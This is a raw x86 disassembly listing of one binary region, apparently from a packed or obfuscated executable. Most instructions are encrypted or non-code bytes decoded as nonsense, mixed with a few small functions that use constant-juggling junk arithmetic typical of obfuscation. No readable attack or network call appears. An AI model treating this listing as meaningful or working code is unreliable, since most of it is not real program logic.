  41566b:	cli    
  41566c:	aaa    
  41566d:	lods   eax,DWORD PTR ds:[esi]
  41566e:	in     eax,dx
  41566f:	shr    cl,cl
  415671:	psubusw mm6,QWORD PTR [esi+0x7a6ff343]
  415678:	sub    al,0x44
  41567a:	mov    WORD PTR [edx+0x59120683],cs
  415680:	inc    ebx
  415681:	test   DWORD PTR [esi-0x4f],esi
  415684:	cmp    esp,edx
  415686:	add    al,0x78
  415688:	mov    al,ds:0x83f7dc40
  41568d:	jmp    0xf36c3f74
  415692:	and    ebx,eax
  415694:	out    dx,al
  415695:	jp     0x41563c
  415697:	int3   
  415698:	not    DWORD PTR [ebx+0x3dea7225]
  41569e:	nop
  41569f:	sbb    ch,BYTE PTR ds:0x6220fe10
  4156a5:	cmp    edi,esp
  4156a7:	ss pop esi
  4156a9:	add    eax,0x2291cde7
  4156ae:	xchg   esp,eax
  4156af:	rcl    BYTE PTR [eax+0x687c3bd3],cl
  4156b5:	out    dx,al
  4156b6:	es xchg ebp,eax
  4156b8:	ja     0x415707
  4156ba:	clc    
  4156bb:	adc    al,0x9e
  4156bd:	jl     0x415720
  4156bf:	fld    QWORD PTR [ebx+0x683f8d4a]
  4156c5:	push   ecx
  4156c6:	pop    edi
  4156c7:	jp     0x415736
  4156c9:	jmp    0x415661
  4156cb:	fld    DWORD PTR [ebx+0x3d87a140]
  4156d1:	push   edx
  4156d2:	(bad)  
  4156d3:	cmp    edx,DWORD PTR [edi]
  4156d5:	jae    0x4156b5
  4156d7:	ins    BYTE PTR es:[edi],dx
  4156d8:	mov    gs,WORD PTR [ecx-0x6b]
  4156db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4156dc:	(bad)  
  4156dd:	ins    BYTE PTR es:[edi],dx
  4156de:	imul   esi,DWORD PTR [esi-0x1aa545da],0x54812ee1
  4156e8:	lds    ebp,FWORD PTR [esi]
  4156ea:	push   0x5b
  4156ec:	inc    BYTE PTR es:[edx+eax*2-0x635c73bb]
  4156f4:	sub    dh,al
  4156f6:	es sti 
  4156f8:	sub    al,0xda
  4156fa:	retf   0xfa77
  4156fd:	call   0x677a:0xe555
  415703:	xlat   BYTE PTR ds:[ebx]
  415704:	sar    BYTE PTR [esi],1
  415706:	and    edx,esi
  415708:	(bad)  
  415709:	loopne 0x415694
  41570b:	inc    esp
  41570c:	mov    WORD PTR [ecx],?
  41570e:	aam    0x66
  415710:	je     0x415696
  415712:	cmc    
  415713:	xchg   ebx,eax
  415714:	push   cs
  415715:	fld    DWORD PTR [ebp+0x36]
  415718:	(bad)  
  415719:	or     cl,BYTE PTR [ebx+0x48]
  41571c:	and    bl,cl
  41571e:	and    DWORD PTR [eax+0x4e],eax
  415721:	pmullw mm3,mm5
  415724:	pop    ecx
  415725:	adc    ch,BYTE PTR [edi+0x37]
  415728:	test   BYTE PTR [edi],ah
  41572a:	and    ah,cl
  41572c:	pop    esi
  41572d:	je     0x4156c8
  41572f:	sbb    dh,ch
  415731:	shr    DWORD PTR [eax+0x1de312ff],cl
  415737:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415738:	popa   
  415739:	pop    edi
  41573a:	jns    0x41570c
  41573c:	xor    cl,BYTE PTR [edx]
  41573e:	sbb    BYTE PTR [ecx+edx*4],bl
  415741:	pop    es
  415742:	cmc    
  415743:	jo     0x41578a
  415745:	bts    DWORD PTR [ecx-0x41],ecx
  415749:	or     eax,DWORD PTR [edi]
  41574b:	inc    eax
  41574c:	test   eax,0x5f1909b
  415751:	push   esp
  415752:	ret    0xb239
  415755:	xchg   ecx,eax
  415756:	mov    esi,eax
  415758:	mov    esi,0x746f1129
  41575d:	jne    0x415770
  41575f:	(bad)  [edx-0x72]
  415762:	jmp    0xad04:0x2ef5a668
  415769:	in     al,0xcf
  41576b:	sub    BYTE PTR [edi-0x77],bh
  41576e:	inc    ecx
  41576f:	pop    ebp
  415770:	aas    
  415771:	bound  eax,QWORD PTR [eax]
  415773:	(bad)  
  415775:	mov    ch,0x35
  415777:	scas   al,BYTE PTR es:[edi]
  415778:	cs pop ds
  41577a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41577b:	sub    al,0xbb
  41577d:	les    ecx,FWORD PTR [edi]
  41577f:	repnz aaa 
  415781:	xor    BYTE PTR ds:0xbca3e36a,al
  415787:	sbb    al,BYTE PTR [esi+0x45]
  41578a:	pop    esp
  41578b:	or     ebp,DWORD PTR [edi+0x1f]
  41578e:	or     BYTE PTR [ebx+0x4c],bl
  415791:	mov    ebp,0x11af4b02
  415796:	jmp    0x2dfa952b
  41579b:	pop    esp
  41579c:	add    BYTE PTR [ecx+0x6b338472],al
  4157a2:	cs call 0x21e3:0xfc794893
  4157aa:	xchg   edi,eax
  4157ab:	std    
  4157ac:	in     al,0xff
  4157ae:	cwde   
  4157af:	outs   dx,BYTE PTR ds:[esi]
  4157b0:	xor    dl,BYTE PTR [ebx+0x2bca8847]
  4157b6:	and    al,0xd2
  4157b8:	mov    eax,ds:0x62d14b8
  4157bd:	inc    esp
  4157be:	lock pop ecx
  4157c0:	dec    ecx
  4157c1:	jl     0x4157cc
  4157c3:	dec    eax
  4157c4:	fnstsw WORD PTR [esi-0x22c8e278]
  4157ca:	mov    si,0xe702
  4157ce:	imul   ebp,DWORD PTR [edx],0x40
  4157d1:	fcmove st,st(0)
  4157d3:	mov    dh,0x22
  4157d5:	sbb    al,0x31
  4157d7:	cmp    al,0x1c
  4157d9:	into   
  4157da:	dec    edx
  4157db:	xchg   esi,eax
  4157dc:	mov    ecx,ecx
  4157de:	push   ecx
  4157df:	in     al,0xd3
  4157e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4157e2:	mov    es,WORD PTR [edx-0x6cd4f294]
  4157e8:	jge    0x41578c
  4157ea:	(bad)  
  4157eb:	fdiv   DWORD PTR [edi-0x1]
  4157ee:	push   ebx
  4157ef:	cmc    
  4157f0:	adc    dh,0xb9
  4157f3:	lds    esi,FWORD PTR [esi+0x73140808]
  4157f9:	jb     0x415788
  4157fb:	iret   
  4157fc:	clc    
  4157fd:	and    al,0xba
  4157ff:	sbb    eax,0x48b40300
  415804:	push   eax
  415805:	add    bh,BYTE PTR [ecx]
  415807:	js     0x4157fe
  415809:	jae    0x415800
  41580b:	ror    BYTE PTR [esi],0xea
  41580e:	mov    bh,BYTE PTR [ebx]
  415810:	icebp  
  415811:	lds    ebp,FWORD PTR es:[ebp+0x6a094c8d]
  415818:	push   edx
  415819:	cmp    DWORD PTR [ebx-0x41],eax
  41581c:	cwde   
  41581d:	test   al,0xb4
  41581f:	lock cmp eax,0x2cb64a8f
  415826:	(bad)  
  415827:	mov    cl,0xf2
  415829:	das    
  41582a:	jne    0x415815
  41582c:	adc    DWORD PTR ds:0x5bac0a6d,edi
  415832:	mov    DWORD PTR [ecx-0xc],edi
  415835:	inc    eax
  415836:	mov    al,0x4b
  415838:	and    BYTE PTR [edx-0x740d118f],dh
  41583e:	or     al,0x72
  415840:	or     BYTE PTR [edx],ch
  415842:	retf   
  415843:	in     al,dx
  415844:	lods   eax,DWORD PTR ds:[esi]
  415845:	lods   al,BYTE PTR ds:[esi]
  415846:	dec    ebx
  415847:	mov    al,0x9d
  415849:	aad    0x10
  41584b:	in     eax,0x5b
  41584d:	mov    dl,0xfa
  41584f:	fwait
  415850:	sbb    esi,ebp
  415852:	pop    ecx
  415853:	push   eax
  415854:	mov    edi,0x4bc5a8f3
  415859:	cmp    esp,DWORD PTR [ebx]
  41585b:	jne    0x4158af
  41585d:	pop    eax
  41585e:	dec    esi
  41585f:	push   edi
  415860:	jnp    0x415809
  415862:	mov    ds:0x8c3cb50e,al
  415867:	scas   eax,DWORD PTR es:[edi]
  415868:	lods   eax,DWORD PTR ds:[esi]
  415869:	std    
  41586a:	loopne 0x4158a9
  41586c:	xchg   ebp,eax
  41586d:	mov    al,ds:0xe935d13b
  415872:	std    
  415873:	repz xor al,0xae
  415876:	sbb    BYTE PTR [edx],bh
  415878:	dec    edi
  415879:	iret   
  41587a:	pop    ds
  41587b:	ficom  DWORD PTR [eax+0x40]
  41587e:	push   esi
  41587f:	outs   dx,DWORD PTR ds:[esi]
  415880:	repz add edx,DWORD PTR [eax]
  415883:	pop    esp
  415884:	nop
  415885:	loope  0x41582e
  415887:	leave  
  415888:	jmp    DWORD PTR [edx+0x53]
  41588b:	jmp    0xa0382ff
  415890:	mov    ebx,0xcbf6ec8c
  415895:	loop   0x415847
  415897:	sbb    esp,DWORD PTR [eax+0x38]
  41589a:	outs   dx,BYTE PTR ds:[esi]
  41589b:	scas   al,BYTE PTR es:[edi]
  41589c:	push   0xffffffb3
  41589e:	(bad)  [edx-0x12bb9c9c]
  4158a4:	and    al,0x53
  4158a6:	inc    ebp
  4158a7:	push   ebx
  4158a8:	and    ecx,DWORD PTR [ebx]
  4158aa:	ret    0x16a
  4158ad:	add    eax,edi
  4158af:	push   eax
  4158b0:	lea    eax,[ebp-0x13]
  4158b3:	push   eax
  4158b4:	shl    ecx,0x1e
  4158b7:	call   0x411c08
  4158bc:	mov    eax,DWORD PTR [ebp+0x10]
  4158bf:	mov    ecx,DWORD PTR [ebp+0x14]
  4158c2:	shrd   eax,ecx,0x2
  4158c6:	shr    ecx,0x2
  4158c9:	mov    ecx,DWORD PTR [ebp+0x10]
  4158cc:	mov    edx,DWORD PTR [ebp+0x14]
  4158cf:	xor    eax,esi
  4158d1:	xor    edx,edx
  4158d3:	or     eax,edx
  4158d5:	add    eax,edi
  4158d7:	push   0x1
  4158d9:	push   eax
  4158da:	mov    eax,DWORD PTR [ebp+0x8]
  4158dd:	shl    ecx,0x1e
  4158e0:	mov    ecx,DWORD PTR [ebp+0xc]
  4158e3:	shrd   eax,ecx,0x2
  4158e7:	shr    ecx,0x2
  4158ea:	mov    ecx,DWORD PTR [ebp+0x8]
  4158ed:	mov    edx,DWORD PTR [ebp+0xc]
  4158f0:	xor    eax,esi
  4158f2:	xor    edx,edx
  4158f4:	or     eax,edx
  4158f6:	add    eax,edi
  4158f8:	push   eax
  4158f9:	shl    ecx,0x1e
  4158fc:	call   0x411c08
  415901:	push   0x1
  415903:	lea    eax,[ebp-0x13]
  415906:	push   eax
  415907:	mov    eax,DWORD PTR [ebp+0x10]
  41590a:	mov    ecx,DWORD PTR [ebp+0x14]
  41590d:	shrd   eax,ecx,0x2
  415911:	shr    ecx,0x2
  415914:	mov    ecx,DWORD PTR [ebp+0x10]
  415917:	mov    edx,DWORD PTR [ebp+0x14]
  41591a:	xor    eax,esi
  41591c:	xor    edx,edx
  41591e:	or     eax,edx
  415920:	add    eax,edi
  415922:	push   eax
  415923:	shl    ecx,0x1e
  415926:	call   0x411c08
  41592b:	mov    eax,DWORD PTR [ebp+0x10]
  41592e:	mov    ecx,DWORD PTR [ebp+0x14]
  415931:	shrd   eax,ecx,0x2
  415935:	shr    ecx,0x2
  415938:	mov    ecx,DWORD PTR [ebp+0x10]
  41593b:	mov    edx,DWORD PTR [ebp+0x14]
  41593e:	pop    edi
  41593f:	xor    eax,esi
  415941:	xor    edx,edx
  415943:	pop    esi
  415944:	shl    ecx,0x1e
  415947:	or     eax,edx
  415949:	pop    ebx
  41594a:	leave  
  41594b:	ret    0x10
  41594e:	mov    eax,DWORD PTR [esp+0x8]
  415952:	or     DWORD PTR ds:0x4284c5,0x7249
  41595c:	mov    ecx,DWORD PTR [esp+0x10]
  415960:	or     ecx,eax
  415962:	mov    DWORD PTR ds:0x428561,0x6956
  41596c:	mov    ecx,DWORD PTR [esp+0xc]
  415970:	jne    0x4159ee
  415976:	cmp    DWORD PTR ds:0x428435,0x0
  41597d:	mov    DWORD PTR ds:0x428555,0x1bde
  415987:	mov    DWORD PTR ds:0x428479,0x1ea7
  415991:	jmp    0x4159e5
  415996:	mov    eax,0x417c
  41599b:	mov    DWORD PTR ds:0x428581,ebx
  4159a1:	cmp    DWORD PTR ds:0x428435,0x0
  4159a8:	jne    0x4159d1
  4159ae:	push   DWORD PTR [ebp-0x28]
  4159b1:	call   DWORD PTR ds:0x42e0e0
  4159b7:	adc    DWORD PTR ds:0x4284c5,0x428409
  4159c1:	sub    DWORD PTR ds:0x42843d,0x4284f9
  4159cb:	and    DWORD PTR ds:0x428455,edi
  4159d1:	mov    DWORD PTR ds:0x42846d,0x6bfe
  4159db:	adc    DWORD PTR ds:0x4284dd,0x437a
  4159e5:	mov    eax,DWORD PTR [esp+0x4]
  4159e9:	mul    ecx
  4159eb:	ret    0x10
  4159ee:	push   ebx
  4159ef:	mul    ecx
  4159f1:	mov    ebx,eax
  4159f3:	mov    eax,DWORD PTR [esp+0x8]
  4159f7:	mul    DWORD PTR [esp+0x14]
  4159fb:	add    ebx,eax
  4159fd:	mov    eax,DWORD PTR [esp+0x8]
  415a01:	mul    ecx
  415a03:	add    edx,ebx
  415a05:	pop    ebx
  415a06:	ret    0x10
  415a09:	push   ebp
  415a0a:	mov    ebp,esp
  415a0c:	sub    esp,0x44
  415a0f:	push   ebx
  415a10:	push   esi
  415a11:	push   edi
  415a12:	mov    DWORD PTR [ebp-0x18],0x2
  415a19:	mov    DWORD PTR [ebp-0x14],0x29f0
  415a20:	mov    DWORD PTR [ebp-0x10],0x3716
  415a27:	mov    DWORD PTR [ebp-0x2c],0x4e09
  415a2e:	mov    DWORD PTR [ebp-0x28],0x4497
  415a35:	mov    DWORD PTR [ebp-0x24],0x5
  415a3c:	mov    DWORD PTR [ebp-0x20],0x2a0a
  415a43:	mov    DWORD PTR [ebp-0x1c],0x1
  415a4a:	mov    DWORD PTR [ebp-0xc],0xce6
  415a51:	mov    DWORD PTR [ebp-0x8],0x12b3
  415a58:	mov    DWORD PTR [ebp-0x4],0xb09
  415a5f:	mov    DWORD PTR [ebp-0x44],0x7617
  415a66:	mov    DWORD PTR [ebp-0x40],0x721a
  415a6d:	mov    DWORD PTR [ebp-0x3c],0x5151
  415a74:	mov    DWORD PTR [ebp-0x38],0x14aa
  415a7b:	mov    DWORD PTR [ebp-0x34],0x5a28
  415a82:	mov    DWORD PTR [ebp-0x30],0x19a8
  415a89:	mov    ecx,DWORD PTR [ebp-0x1c]
  415a8c:	mov    eax,DWORD PTR [ebp-0x20]
  415a8f:	xor    edx,edx
  415a91:	div    ecx
  415a93:	mov    ecx,DWORD PTR [ebp-0x24]
  415a96:	xor    edx,edx
  415a98:	mov    esi,0x1ac5
  415a9d:	push   0x20
  415a9f:	div    ecx
  415aa1:	mov    ecx,DWORD PTR [ebp-0x28]
  415aa4:	xor    edx,edx
  415aa6:	xor    eax,0x60dc
  415aab:	sub    eax,ecx
  415aad:	mov    ecx,DWORD PTR [ebp-0x2c]
  415ab0:	lea    edi,[eax+ecx*1-0x6300]
  415ab7:	mov    eax,DWORD PTR [ebp-0x4]
  415aba:	mov    ecx,DWORD PTR [ebp-0x8]
  415abd:	sub    eax,0x7721
  415ac2:	xor    eax,ecx
  415ac4:	mov    ecx,DWORD PTR [ebp-0xc]
  415ac7:	xor    eax,ecx
  415ac9:	or     eax,0x7bc9
  415ace:	xor    eax,0xfffff0db
  415ad3:	mov    ebx,edi
  415ad5:	sub    ebx,eax
  415ad7:	mov    eax,DWORD PTR [ebp-0x10]
  415ada:	mov    ecx,DWORD PTR [ebp-0x14]
  415add:	xor    eax,ecx
  415adf:	mov    ecx,DWORD PTR [ebp-0x18]
  415ae2:	sub    eax,esi
  415ae4:	div    ecx
  415ae6:	mov    ecx,0x211
  415aeb:	pop    edx
  415aec:	xor    eax,ecx
  415aee:	jmp    0x415ef7
  415af3:	push   ds
  415af4:	inc    ecx
  415af5:	cmp    edi,esi
  415af7:	mov    edx,0x9f9c24b7
  415afc:	push   ecx
  415afd:	mov    ebp,0xfc8538cf
  415b02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415b03:	pushf  
  415b04:	mov    esp,0xc48ebebe
  415b09:	mov    esi,0xb3d86fbe
  415b0e:	xchg   ebx,eax
  415b0f:	push   0xf150066c
  415b14:	push   ebx
  415b15:	cmp    DWORD PTR [ecx+edx*8-0x710eb0],edx
  415b1c:	loopne 0x415b93
  415b1e:	mov    al,0xae
  415b20:	add    ah,cl
  415b22:	ja     0x415af8
  415b24:	sub    al,0x5c
  415b26:	jbe    0x415b83
  415b28:	xchg   esi,eax
  415b29:	dec    edx
  415b2a:	dec    edi
  415b2b:	ret    0x8d3c
  415b2e:	adc    al,0xd4
  415b30:	jle    0x415b78
  415b32:	add    eax,DWORD PTR ss:[esi+0x4c]
  415b36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415b37:	in     eax,0xec
  415b39:	xor    BYTE PTR [edx+ebp*2],bl
  415b3c:	xor    ecx,0xffffffee
  415b3f:	repz js 0x415ad7
  415b42:	adc    al,0x18
  415b44:	jno    0x415b07
  415b46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415b47:	mov    WORD PTR [ebx+0x57],?
  415b4a:	enter  0x4c20,0xc2
  415b4e:	mov    esi,0x97ef629a
  415b53:	sti    
  415b54:	sbb    DWORD PTR [esi-0x5513a768],ebp
  415b5a:	into   
  415b5b:	mov    esi,0x3b1385f3
  415b60:	dec    ecx
  415b61:	mov    DWORD PTR [eax],ebx
  415b63:	xor    DWORD PTR ds:0x3d5e734,ebp
  415b69:	or     bh,BYTE PTR ds:0xd6e750f7
  415b6f:	fstp   DWORD PTR [ebx]
  415b71:	push   eax
  415b72:	fild   DWORD PTR [esi-0x62]
  415b75:	and    eax,ebx
  415b77:	mov    ecx,DWORD PTR [esi]
  415b79:	fistp  DWORD PTR cs:[ecx+0x1f]
  415b7d:	xchg   ecx,eax
  415b7e:	rol    dh,cl
  415b80:	loop   0x415b02
  415b82:	sub    edx,DWORD PTR [esi+0x52]
  415b85:	je     0x415bf6
  415b87:	inc    edi
  415b88:	dec    ebp
  415b89:	pop    eax
  415b8a:	or     edi,DWORD PTR [edx+0x111d0894]
  415b90:	data16 mov dh,0x3b
  415b93:	mov    cl,0xcd
  415b95:	pop    edi
  415b96:	call   0x4b4bd5a1
  415b9b:	dec    ebx
  415b9c:	sub    al,0x59
  415b9e:	pop    ds
  415b9f:	xchg   BYTE PTR [esi+0x6b],cl
  415ba2:	lods   eax,DWORD PTR ds:[esi]
  415ba3:	and    ebx,0xffffffc2
  415ba6:	inc    ebx
  415ba7:	call   0x468b:0xfc06773c
  415bae:	dec    eax
  415baf:	dec    ebp
  415bb0:	inc    eax
  415bb1:	sub    BYTE PTR [ecx+0x18e8e7b7],ch
  415bb7:	nop
  415bb8:	clc    
  415bb9:	push   esi
  415bba:	mov    ds:0x8baa80d0,eax
  415bbf:	ret    
  415bc0:	mov    ecx,0x6c83dd3c
  415bc5:	outs   dx,BYTE PTR ds:[esi]
  415bc6:	stos   DWORD PTR es:[edi],eax
  415bc7:	cmp    eax,0x6a6b576c
  415bcc:	add    al,0x18
  415bce:	mov    ds:0x315474ca,al
  415bd3:	mov    esp,0xcc343bb9
  415bd8:	(bad)
  415bdb:	jle    0x415c3b
  415bdd:	pop    ebp
  415bde:	jl     0x415b64
  415be0:	test   DWORD PTR [ebp-0x272efa20],0x604435e8
  415bea:	int    0xe7
  415bec:	mov    ds:0x5bf79b51,al
  415bf1:	in     al,0x62
  415bf3:	sbb    esp,DWORD PTR ds:0xf751af6a
  415bf9:	push   ebp
  415bfb:	mov    ds:0x3f4584f8,al
  415c00:	add    DWORD PTR [edx-0x76],eax
  415c03:	cmc    
  415c04:	push   ds
  415c05:	call   0x4f77:0x8d81c4ef
  415c0c:	call   0x3fad7ee0
  415c11:	push   edi
  415c12:	dec    ebp
  415c13:	mov    esp,0xa34329b7
  415c18:	and    BYTE PTR gs:[edi],0xa3
  415c1c:	ss push eax
  415c1e:	sub    ah,BYTE PTR [edi]
  415c20:	and    DWORD PTR [ecx-0x197d70cf],ebp
  415c26:	add    eax,0xae76814c
  415c2b:	xchg   edx,ebx
  415c2d:	or     bh,bl
  415c2f:	data16 sub bl,BYTE PTR [ecx+0x3c71ce40]
  415c36:	dec    ebp
  415c37:	sbb    eax,0xe1a4d6eb
  415c3c:	stos   BYTE PTR es:[edi],al
  415c3d:	xlat   BYTE PTR ds:[ebx]
  415c3e:	mov    edi,0x67deb07b
  415c43:	xchg   DWORD PTR [edi-0x77d912fc],esi
  415c49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c4a:	xchg   edx,eax
  415c4b:	(bad)  
  415c4c:	and    cl,bh
  415c4e:	outs   dx,DWORD PTR ds:[esi]
  415c4f:	addr16 xor al,0x2f
  415c52:	int    0x65
  415c54:	das    
  415c55:	lea    edx,[ebx]
  415c57:	test   DWORD PTR [edi+0x387bc070],0xd60badeb
  415c61:	inc    eax
  415c62:	mov    al,ss:0xad5d952a
  415c68:	(bad)  
  415c69:	stos   BYTE PTR es:[edi],al
  415c6a:	sbb    cl,dh
  415c6c:	inc    ecx
  415c6d:	adc    al,0xa
  415c6f:	push   0xff458023
  415c74:	xor    al,0x2a
  415c76:	push   eax
  415c77:	mov    ah,BYTE PTR [eax+0x5ab13833]
  415c7d:	push   es
  415c7e:	jo     0x415c06
  415c80:	out    0xe7,eax
  415c82:	sub    eax,0x41ddb252
  415c87:	jbe    0x415c7d
  415c89:	(bad)  
  415c8a:	xchg   edi,eax
  415c8b:	js     0x415c41
  415c8d:	xor    BYTE PTR [ebx],dl
  415c8f:	(bad)
  415c92:	aaa    
  415c93:	pop    edx
  415c94:	rol    DWORD PTR [eax+0x213fc96a],0x6e
  415c9b:	jle    0x415c6b
  415c9d:	aas    
  415c9e:	and    BYTE PTR [ebx+0x388189e3],ch
  415ca4:	sub    edi,esp
  415ca6:	mov    dh,0x6a
  415ca8:	cwde   
  415ca9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415caa:	leave  
  415cab:	into   
  415cac:	addr16 mov bl,0xc2
  415caf:	sub    ebx,ecx
  415cb1:	call   0x2c498f31
  415cb6:	aas    
  415cb7:	and    ebp,ebp
  415cb9:	sub    dh,BYTE PTR [edx-0x5d]
  415cbc:	sub    eax,0x9f2d78b
  415cc1:	loope  0x415d2a
  415cc3:	sar    BYTE PTR ds:0x7229d918,cl
  415cc9:	or     cl,BYTE PTR [esi+0x3f]
  415ccc:	retf   0x1bd7
  415ccf:	inc    ebx
  415cd0:	fbld   TBYTE PTR [edx]
  415cd2:	mov    BYTE PTR [ebx+0x1456388c],bh
  415cd8:	cdq    
  415cd9:	sar    BYTE PTR [eax+0x4d],0x35
  415cdd:	das    
  415cde:	fisttp WORD PTR [ecx+0x1f]
  415ce1:	aam    0xed
  415ce3:	xor    DWORD PTR [edx+0x46],0x19
  415ce7:	mov    cl,0xea
  415ce9:	ret    
  415cea:	test   DWORD PTR [edx+0x28],ecx
  415ced:	outs   dx,DWORD PTR ds:[esi]
  415cee:	mov    bl,0x37
  415cf0:	(bad)  [edi-0x3a846b8e]
  415cf6:	neg    DWORD PTR [eax+0x24a6138b]
  415cfc:	(bad)  
  415cfd:	loop   0x415d13
  415cff:	sti    
  415d00:	pop    ebp
  415d01:	in     eax,0x36
  415d03:	sub    BYTE PTR [eax+0xa],dl
  415d06:	jle    0x415d56
  415d08:	xchg   edx,eax
  415d09:	ss je  0x415c98
  415d0c:	cmp    dh,BYTE PTR [edx]
  415d0e:	sbb    edi,ebx
  415d10:	psllw  mm7,QWORD PTR [ebp+0x594a2cfb]
  415d17:	adc    eax,edx
  415d19:	test   DWORD PTR [esi],ebx
  415d1b:	rcr    DWORD PTR [eax+0x4a],0xf3
  415d1f:	lahf   
  415d20:	lock fisubr DWORD PTR [bx+0x0]
  415d25:	rcl    DWORD PTR [ebx+0x22],1
  415d28:	inc    eax
  415d29:	dec    si
  415d2b:	pop    esi
  415d2c:	in     eax,0xf1
  415d2e:	jb     0x415cbd
  415d30:	mov    dh,0x25
  415d32:	enter  0x7814,0x6c
  415d36:	arpl   WORD PTR [edi],si
  415d38:	jl     0x415d05
  415d3a:	inc    esi
  415d3b:	arpl   WORD PTR [ecx],bp
  415d3d:	fs pop ecx
  415d3f:	pop    ebp
  415d40:	push   edx
  415d41:	mov    bl,0x16
  415d43:	shr    edx,cl
  415d45:	ror    DWORD PTR [esi],1
  415d47:	add    al,0xf
  415d49:	or     BYTE PTR [eax+0x464c563],ah
  415d4f:	mov    ebp,edx
  415d51:	push   cs
  415d52:	pop    ebx
  415d53:	popa   
  415d54:	sbb    eax,0xc1a96c37
  415d59:	jg     0x415d13
  415d5b:	jmp    0x415d15
  415d5d:	adc    al,0x5e
  415d5f:	xchg   esp,eax
  415d60:	into   
  415d61:	and    eax,0x129b36c0
  415d66:	sub    edi,DWORD PTR [edx+ebx*8+0x67]
  415d6a:	inc    esp
  415d6b:	fild   WORD PTR [esi+0x41]
  415d6e:	fild   DWORD PTR [eax+0x3b58877a]
  415d74:	pop    ebp
  415d75:	xchg   edx,eax
  415d76:	repz into 
  415d78:	and    al,0x4a
  415d7a:	sti    
  415d7b:	jmp    0xcc5a:0xe1a3c259
  415d82:	pop    ebp
  415d83:	sbb    bl,BYTE PTR [edi]
  415d85:	ret    0x7640
  415d88:	jbe    0x415d85
  415d8a:	inc    DWORD PTR [ecx-0x7b79237b]
  415d90:	adc    al,0x94
  415d92:	mov    ds:0x65c15cea,eax
  415d97:	sbb    al,0x3f
  415d99:	jne    0x415d35
  415d9b:	adc    eax,0x9353e52b
  415da0:	test   edi,edi
  415da2:	call   FWORD PTR [edx-0x238caa09]
  415da8:	and    bh,BYTE PTR [ebp+0x3377e5db]
  415dae:	cs ja  0x8f87cecd
  415db5:	sti    
  415db6:	repnz bound ebx,QWORD PTR fs:[edi+0x3768b0d2]
  415dbe:	out    0x2e,al
  415dc0:	icebp  
  415dc1:	cmp    cl,bh
  415dc3:	scas   eax,DWORD PTR es:[edi]
  415dc4:	jecxz  0x415dcf
  415dc6:	js     0x415e0f
  415dc8:	cs adc al,0xf5
  415dcb:	jp     0x415e17
  415dcd:	int    0x15
  415dcf:	pop    ss
  415dd0:	cld    
  415dd1:	jmp    0xa6fee428
  415dd6:	push   ecx
  415dd7:	leave  
  415dd8:	dec    ebp
  415dd9:	mov    ebp,0xb36780a7
  415dde:	lea    ebx,[edi]
  415de0:	xchg   esp,eax
  415de1:	mov    edx,0x1be3b2d9
  415de6:	bound  ebp,QWORD PTR [edx+edi*2-0x5cb6ed20]
  415ded:	lods   al,BYTE PTR ds:[esi]
  415dee:	mov    al,ds:0x9be79ef0
  415df3:	in     al,dx
  415df4:	adc    DWORD PTR [ecx],0x47
  415df7:	xor    DWORD PTR [ebx],0x7e830b4
  415dfd:	in     al,0xc1
  415dff:	pop    ds
  415e00:	inc    ebp
  415e01:	cmp    al,0x2c
  415e03:	pusha  
  415e04:	sti    
  415e05:	xor    eax,edx
  415e07:	mul    BYTE PTR [ebp+0x7942c573]
  415e0d:	outs   dx,BYTE PTR ds:[esi]
  415e0e:	xor    eax,0x99bbc9
  415e13:	xlat   BYTE PTR ds:[ebx]
  415e14:	and    dl,0x55
  415e17:	mov    esi,esi
  415e19:	or     al,0x40
  415e1b:	(bad)  
  415e1c:	xchg   dh,dh
  415e1e:	push   ds
  415e1f:	pandn  mm6,QWORD PTR [ebx-0xf]
  415e23:	push   ss
  415e24:	xchg   ecx,eax
  415e25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415e26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e27:	int    0xfb
  415e29:	aam    0x12
  415e2b:	mov    eax,gs:0xb08f15ae
  415e31:	pop    esp
  415e32:	out    dx,eax
  415e33:	or     DWORD PTR [edi+0x43],ebp
  415e36:	(bad)  
  415e37:	sahf   
  415e38:	mov    edi,0x7bef7f3c
  415e3d:	jne    0x415e46
  415e3f:	aam    0x85
  415e41:	add    esp,0x1cf01929
  415e47:	push   ebp
  415e48:	dec    esi
  415e49:	inc    ecx
  415e4a:	fisub  DWORD PTR [esi]
  415e4c:	sub    esi,DWORD PTR [eax]
  415e4e:	fldenv [ecx-0x1126c178]
  415e54:	mov    ds:0xfedfe3b5,eax
  415e59:	mov    WORD PTR [ecx-0x6f],?
  415e5c:	sahf   
  415e5d:	ja     0x415df7
  415e5f:	dec    ebp
  415e60:	test   eax,0xadc34058
  415e65:	addr16 add bh,al
  415e68:	leave  
  415e69:	jle    0x415e80
  415e6b:	pop    ss
  415e6c:	ror    BYTE PTR ds:0xb45052ee,1
  415e72:	clc    
  415e73:	ret    0x6f50
  415e76:	scas   eax,DWORD PTR es:[edi]
  415e77:	imul   ecx,DWORD PTR [eax+0x7e],0xffffffcc
  415e7b:	test   ch,bl
  415e7d:	pop    ebx
  415e7e:	jnp    0x415e22
  415e80:	xchg   ebp,eax
  415e81:	mov    cl,0xb5
  415e83:	mov    ecx,0x3c565f3d
  415e88:	shr    DWORD PTR [ecx+eax*4+0x16adff08],1
  415e8f:	xchg   ebx,eax
  415e90:	int3   
  415e91:	push   edi
  415e92:	sub    BYTE PTR [esi-0x7139cb5d],0xf4
  415e99:	sub    eax,DWORD PTR [ecx+0xb56222b]
  415e9f:	mov    ah,0x5b
  415ea1:	jb     0x415e7b
  415ea3:	repz mov edx,0xe49c3d77
  415ea9:	inc    ecx
  415eaa:	adc    ch,bh
  415eac:	adc    dh,BYTE PTR cs:[ebp-0x3b93aef7]
  415eb3:	mov    cl,0x91
  415eb5:	sub    al,0x43
  415eb7:	outs   dx,DWORD PTR ds:[esi]
  415eb8:	loope  0x415ead
  415eba:	(bad)  
  415ebb:	aad    0x26
  415ebd:	outs   dx,DWORD PTR ds:[esi]
  415ebe:	cmp    DWORD PTR [eax+0x7],ebx
  415ec1:	jns    0x415efc
